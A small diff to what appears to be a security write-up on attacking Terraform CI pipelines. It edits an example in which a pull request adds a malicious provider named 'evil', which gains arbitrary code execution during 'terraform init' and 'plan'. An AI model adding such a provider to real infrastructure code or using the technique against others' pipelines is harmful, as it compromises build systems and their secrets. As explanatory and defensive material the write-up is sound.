@@ -37,13 +37,11 @@ That's it:
 - add the provider to the Terraform code in a feature branch
 - open a PR for the feature branch
 
-Since the provider will be pulled in during the `init` and run some code during the `plan`, you have arbitrary code execution.
-
 ```
 terraform {
   required_providers {
     evil = {
-      source  = "alxk/evil"
+      source  = "evil/evil"
       version = "1.0"
     }
   }
@@ -51,6 +49,8 @@ terraform {
 
 provider "evil" {}
 ```
+
+Since the provider will be pulled in during the `init` and run some code during the `plan`, you have arbitrary code execution.
 
 ## Using the `external` Provider
 
